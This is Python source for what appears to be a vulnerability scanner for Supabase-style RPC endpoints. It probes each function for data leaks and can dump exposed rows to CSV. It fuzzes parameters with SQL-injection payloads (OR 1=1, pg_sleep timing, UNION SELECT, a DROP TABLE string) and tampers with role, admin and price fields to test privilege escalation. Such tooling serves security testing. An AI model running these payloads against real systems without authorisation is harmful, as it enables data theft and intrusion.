from typing import List ,Dict ,Any 
from ssf.core .base import BaseScanner 
import httpx 
import json 
import time 
import csv 
import os 
from datetime import datetime 
from ssf.core .utils import generate_smart_payload 
class RPCScanner (BaseScanner ):
    def __init__ (self ,client :httpx .AsyncClient ,verbose :bool =False ,context :Dict [str ,Any ]=None ,dump_all :bool =False ,output_dir :str =None ):
        super ().__init__ (client ,verbose ,context )
        self .dump_all =dump_all 
        self .output_dir =output_dir 

    def extract_rpcs (self ,spec :Dict )->List [Dict ]:
        rpcs =[]
        if not spec or "paths"not in spec :return rpcs 
        for path ,path_methods in spec .get ("paths",{}).items ():
            if path .startswith ('/rpc/'):
                rpc_name =path .replace ("/rpc/","")
                for method ,method_details in path_methods .items ():
                    method_lower =method .lower ()
                    if method_lower in ['get','post']:
                        required_params =[]
                        params_list =method_details .get ('parameters',[])
                        if method_lower =='post':
                            body_param =next ((p for p in params_list if p .get ('in')=='body'),None )
                            if body_param and 'schema'in body_param :
                                schema =body_param ['schema']
                                if '$ref'in schema :
                                    ref_path =schema ['$ref'].split ('/')
                                    target =spec 
                                    if len (ref_path )>1 and ref_path [0 ]=='#':
                                        try :
                                            for c in ref_path [1 :]:
                                                target =target [c ]
                                            schema =target 
                                        except (KeyError ,TypeError ):
                                            schema ={}
                                if 'properties'in schema :
                                    required_names =schema .get ('required',[])
                                    for name ,details in schema ['properties'].items ():
                                        if name in required_names :
                                            details ['name']=name 
                                            details ['in']='body'
                                            required_params .append (details )
                            else :
                                required_params .extend ([p for p in params_list if p .get ('in')=='formData'and p .get ('required',False )])
                        elif method_lower =='get':
                            required_params .extend ([p for p in params_list if p .get ('in')=='query'and p .get ('required',False )])
                        for param in required_params :
                            if 'in'not in param :
                                param ['in']='body'if method_lower =='post'else 'query'
                        rpcs .append ({'name':rpc_name ,'method':method_lower ,'params_spec':required_params })
        unique_rpcs =[]
        seen =set ()
        for rpc in rpcs :
            key =(rpc ['name'],rpc ['method'])
            if key not in seen :
                unique_rpcs .append (rpc )
                seen .add (key )
        return unique_rpcs 
    def _generate_placeholder (self ,param_info :Dict [str ,Any ])->Any :
        p_type =param_info .get ('type','string')
        p_format =param_info .get ('format','')
        p_in =param_info .get ('in','query')
        if p_type =='integer':return 1 
        elif p_type =='number':return 1.0 
        elif p_type =='boolean':return True 
        elif p_type =='array':return ["test"]if p_in =='body'else "{test}"
        elif p_type =='string':
            if p_format =='uuid':return "00000000-0000-0000-0000-000000000000"
            elif p_format in ['date','date-time']:return "2024-01-01T00:00:00+00:00"
            elif p_format =='json':return {"test":"value"}
            return "test_string"
        elif p_type =='object':return {"test":"value"}
        return "test"
    async def scan (self ,rpc :Dict )->Dict [str ,Any ]:
        endpoint =f"/rest/v1/rpc/{rpc ['name']}"
        result ={"name":rpc ["name"],"method":rpc ["method"].upper (),"executable":False ,"leaked_data":False ,"sample_rows":[],"sqli_suspected":False }
        self .log (f"[*] Testing RPC: {rpc ['name']}","cyan")
        params_data ={}
        query_params ={}
        for param in rpc .get ('params_spec',[]):
            val =self ._generate_placeholder (param )
            if rpc ['method']=='post':
                params_data [param ['name']]=val 
            else :
                query_params [param ['name']]=str (val ).lower ()if isinstance (val ,bool )else val 
        try :
            if rpc ["method"]=="post":
                r =await self .client .post (endpoint ,json =params_data or {},timeout =15.0 )
            else :
                r =await self .client .get (endpoint ,params =query_params ,timeout =15.0 )
            if r .status_code in (200 ,206 ):
                result ["executable"]=True 
                try :
                    data =r .json ()
                    if (isinstance (data ,list )and data )or (isinstance (data ,dict )and data ):
                        result ["leaked_data"]=True 
                        result ["sample_rows"]=data [:5 ]if isinstance (data ,list )else [data ]
                        self .log (f"[!] DATA LEAK via RPC '{rpc ['name']}' → {len (data )if isinstance (data ,list )else 1 } rows","bold red")

                        if self .dump_all :
                            try :
                                if self .output_dir :
                                    dump_dir =os .path .join (self .output_dir ,"dumps")
                                else :
                                    dump_dir ="dumps"
                                os .makedirs (dump_dir ,exist_ok =True )
                                timestamp =datetime .now ().strftime ("%Y%m%d_%H%M%S")
                                filename =f"{dump_dir }/rpc_{rpc ['name']}_{timestamp }.csv"

                                rows_to_dump =data if isinstance (data ,list )else [data ]
                                if rows_to_dump :
                                    keys =rows_to_dump [0 ].keys ()
                                    with open (filename ,"w",newline ="",encoding ="utf-8")as f :
                                        writer =csv .DictWriter (f ,fieldnames =keys )
                                        writer .writeheader ()
                                        writer .writerows (rows_to_dump )
                                    self .log (f"    [+] Data dumped to {filename }","green")
                            except Exception as e :
                                self .log_warn (f"    [!] Failed to dump CSV: {e }")

                        self .context .setdefault ("leaked_via_rpc",[]).append ({"rpc":rpc ['name'],"sample":result ["sample_rows"]})
                        sample_str =json .dumps (result ["sample_rows"])
                        if "rolname"in sample_str or "pg_authid"in sample_str or "passwd"in sample_str :
                             self .log (f"    [!!!] CRITICAL: RPC '{rpc ['name']}' exposes SYSTEM TABLES (Possible SECURITY DEFINER Escalation)","bold red on white")
                             result ["risk"]="CRITICAL"
                except Exception as e :
                    self .log_error (e )
        except Exception as e :
            self .log_error (e )
        except Exception as e :
            self .log_error (e )
        if result ["executable"]:
            await self ._deep_scan_data_access (rpc ,result )
            await self .fuzz_logic (rpc ,result )
            sqli_payloads =self .get_advanced_sqli_payloads ()
            for param in rpc .get ('params_spec',[]):
                if param .get ('type')=='string':
                    self .log (f"    [*] Fuzzing {param ['name']} with {len (sqli_payloads )} SQLi payloads...","cyan")
                    for payload in sqli_payloads :
                        fuzzed_params =params_data .copy ()if rpc ['method']=='post'else query_params .copy ()
                        if rpc ['method']=='post':
                            fuzzed_params [param ['name']]=payload 
                        else :
                            fuzzed_params [param ['name']]=payload 
                        try :
                            if rpc ["method"]=="post":
                                r_sqli =await self .client .post (endpoint ,json =fuzzed_params ,timeout =5.0 )
                            else :
                                r_sqli =await self .client .get (endpoint ,params =fuzzed_params ,timeout =5.0 )
                            if r_sqli .status_code ==500 or any (e in r_sqli .text .lower ()for e in ["syntax error","postgres","pg_sleep","syntax","unterminated"]):
                                self .log (f"    [!] Potential SQL Injection in {rpc ['name']} (param: {param ['name']}) - Verifying...","yellow")
                                try :
                                    sleep_payload =" OR pg_sleep(5)--"
                                    start_time =time .time ()
                                    verify_params =fuzzed_params .copy ()
                                    verify_params [param ['name']]=sleep_payload 
                                    if rpc ["method"]=="post":
                                        await self .client .post (endpoint ,json =verify_params ,timeout =10.0 )
                                    else :
                                        await self .client .get (endpoint ,params =verify_params ,timeout =10.0 )
                                    duration =time .time ()-start_time 
                                    if duration >4.5 :
                                        self .log (f"    [!!!] CONFIRMED Time-Based SQL Injection in {rpc ['name']} ({duration :.2f}s)","bold red on white")
                                        result ["sqli_suspected"]=True 
                                        result ["risk"]="CRITICAL"
                                        break 
                                except Exception as e :
                                    self .log_error (e )
                                result ["sqli_suspected"]=True 
                                break 
                        except Exception as e :
                            self .log_error (e )
                    if result ["sqli_suspected"]:break 
        return result 
    def get_advanced_sqli_payloads (self )->List [str ]:
        level =self .client .config .level 
        payloads =[
        "'","\"",
        "' OR 1=1 --",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        ]

        if level >=2 :
            payloads .extend ([
            "' AND 1=cast((SELECT version()) as int)--",
            "' OR 1=cast((SELECT version()) as int)--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT pg_sleep(5); --",
            ])

        if level >=3 :
            payloads .extend ([
            "' OR pg_sleep(5)--",
            "\" OR pg_sleep(5)--",
            "; DROP TABLE non_existent_table; --",
            "$$ OR 1=1 --$$",
            "$quote$ OR 1=1 --$quote$",
            ])

        if level >=4 :
            payloads .extend ([
            "'/**/OR/**/1=1/**/--",
            "{\"a\": 1} OR 1=1",
            "' UNION SELECT NULL, NULL, NULL--",
            ])

        if level >=5 :
            payloads .extend ([
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            ])

        if self .client .config .tamper :
            from ssf.core .tamper import TamperManager 
            tm =TamperManager (self .client .config .tamper )
            payloads =[tm .tamper (p )for p in payloads ]

        return payloads 
    async def fuzz_logic (self ,rpc :Dict ,result :Dict ):
        endpoint =f"/rest/v1/rpc/{rpc ['name']}"
        sensitive_params ={
        "is_admin":[True ,"true",1 ],
        "admin":[True ,"true",1 ],
        "role":["admin","superuser","service_role"],
        "price":[0 ,0.01 ,-1 ],
        "amount":[0 ,0.01 ,-1 ],
        "status":["paid","approved","verified"],
        "verified":[True ,"true",1 ]
        }
        params_spec =rpc .get ('params_spec',[])
        target_params =[p for p in params_spec if p ['name'].lower ()in sensitive_params ]
        if not target_params :
            return 
        self .log (f"    [*] Logic Fuzzing {len (target_params )} sensitive parameters in {rpc ['name']}...","cyan")
        for param in target_params :
            param_name =param ['name']
            payloads =sensitive_params .get (param_name .lower (),[])
            for payload in payloads :
                fuzzed_data ={}
                for p in params_spec :
                    if p ['name']==param_name :
                        fuzzed_data [p ['name']]=payload 
                    else :
                        fuzzed_data [p ['name']]=self ._generate_placeholder (p )
                try :
                    if rpc ["method"]=="post":
                        r =await self .client .post (endpoint ,json =fuzzed_data ,timeout =5.0 )
                    else :
                        r =await self .client .get (endpoint ,params =fuzzed_data ,timeout =5.0 )
                    if r .status_code in (200 ,201 ,204 ):
                        self .log (f"    [!] Logic Fuzz Success: {param_name }={payload } -> HTTP {r .status_code }","bold yellow")
                        result .setdefault ("logic_flaws",[]).append ({
                        "param":param_name ,
                        "payload":payload ,
                        "status":r .status_code 
                        })
                        if param_name in ["is_admin","admin","role"]or (param_name in ["price","amount"]and payload <=0 ):
                             self .log (f"    [!!!] CRITICAL: Possible Privilege Escalation/Business Logic Flaw via {param_name }={payload }","bold red on white")
                             result ["risk"]="CRITICAL"
                except Exception as e :
                    self .log_error (e )
    async def _deep_scan_data_access (self ,rpc :Dict ,result :Dict ):
        self .log (f"    [*] Deep Scanning {rpc ['name']} for data leakage...","cyan")
        endpoint =f"/rest/v1/rpc/{rpc ['name']}"
        param_dict ={p ['name']:p .get ('type','string')for p in rpc .get ('params_spec',[])}
        smart_payload =generate_smart_payload (param_dict )
        for p in rpc .get ('params_spec',[]):
            if p .get ('type')=='string':
                smart_payload [p ['name']]="%"
        try :
            if rpc ["method"]=="post":
                r =await self .client .post (endpoint ,json =smart_payload ,timeout =10.0 )
            else :
                r =await self .client .get (endpoint ,params =smart_payload ,timeout =10.0 )
            if r .status_code in (200 ,206 ):
                data =r .json ()
                if data :
                    count =len (data )if isinstance (data ,list )else 1 
                    self .log (f"    [!] DEEP SCAN: Extracted {count } records using smart payload!","bold red")
                    result ["leaked_data"]=True 
                    result ["sample_rows"]=data [:5 ]if isinstance (data ,list )else [data ]
                    sample_str =json .dumps (result ["sample_rows"])
                    if any (k in sample_str for k in ["password","secret","token","key","hash","admin"]):
                         self .log (f"    [!!!] SENSITIVE DATA found in RPC response!","bold red on white")
                         result ["risk"]="CRITICAL"
        except Exception as e :
            self .log_error (e )
    async def scan_chains (self ,all_rpcs :List [Dict ])->List [Dict ]:
        chains =[
        {
        "name":"Draft -> Publish",
        "steps":[
        {"rpc":"create_draft","method":"post","params":{"title":"test_chain","content":"test"},"extract":{"draft_id":"id"}},
        {"rpc":"publish_post","method":"post","params":{"id":"$draft_id"}}
        ]
        },
        {
        "name":"Order -> Checkout",
        "steps":[
        {"rpc":"create_order","method":"post","params":{"items":[{"id":1 ,"qty":1 }]},"extract":{"order_id":"id"}},
        {"rpc":"checkout","method":"post","params":{"order_id":"$order_id"}}
        ]
        }
        ]
        results =[]
        available_rpc_names ={r ['name']for r in all_rpcs }
        for chain in chains :
            if not all (step ['rpc']in available_rpc_names for step in chain ['steps']):
                continue 
            self .log (f"[*] Testing Chain: {chain ['name']}","cyan")
            context ={}
            chain_success =True 
            for step in chain ['steps']:
                rpc_name =step ['rpc']
                method =step .get ('method','post')
                params =step .get ('params',{}).copy ()
                for k ,v in params .items ():
                    if isinstance (v ,str )and v .startswith ("$"):
                        var_name =v [1 :]
                        if var_name in context :
                            params [k ]=context [var_name ]
                        else :
                            self .log (f"    [!] Missing context variable '{var_name }' for {rpc_name }. Chain aborted.","yellow")
                            chain_success =False 
                            break 
                if not chain_success :break 
                endpoint =f"/rest/v1/rpc/{rpc_name }"
                try :
                    if method =='post':
                        r =await self .client .post (endpoint ,json =params ,timeout =10.0 )
                    else :
                        r =await self .client .get (endpoint ,params =params ,timeout =10.0 )
                    if r .status_code in (200 ,201 ,204 ):
                        self .log (f"    [+] Step '{rpc_name }' succeeded ({r .status_code })","green")
                        if 'extract'in step :
                            data =r .json ()
                            if isinstance (data ,list )and data :data =data [0 ]
                            for var_name ,key in step ['extract'].items ():
                                if isinstance (data ,dict )and key in data :
                                    context [var_name ]=data [key ]
                                    self .log (f"        -> Extracted {var_name } = {data [key ]}","dim")
                                else :
                                    self .log (f"        [!] Failed to extract '{key }' from response.","yellow")
                    else :
                        self .log (f"    [-] Step '{rpc_name }' failed ({r .status_code })","red")
                        chain_success =False 
                        break 
                except Exception as e :
                    self .log_error (e )
                    chain_success =False 
                    break 
            if chain_success :
                self .log (f"    [!] Chain '{chain ['name']}' COMPLETED SUCCESSFULLY!","bold green")
                results .append ({"name":chain ['name'],"status":"success","context":context })
        return results 
